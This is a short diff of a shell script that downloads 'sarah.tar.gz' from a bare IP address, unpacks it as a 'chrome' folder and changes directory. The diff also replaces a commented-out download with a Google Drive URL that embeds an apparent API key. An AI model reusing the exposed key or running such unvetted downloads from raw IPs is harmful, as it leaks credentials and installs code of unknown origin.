@@ -80,8 +80,8 @@ wget http://173.212.241.46/sarah.tar.gz
 tar -xvf sarah.tar.gz && mv chrome sarah
 mv sarah chrome
 sleep 1
-cd chrome
-#wget 82.163.73.24/profile-chrome.zip
+cd /home/chrome
+#wget https://www.googleapis.com/drive/v3/files/1_iODWQ23thDrmit8iWVfR65P7V6Jtzle?alt=media&key=AIzaSyAh1_vrmX1z-6W7hXQDsArVhc4UJVkkfo4
 #rm -rf Default
 #unzip profile-chrome.zip
 sleep 2
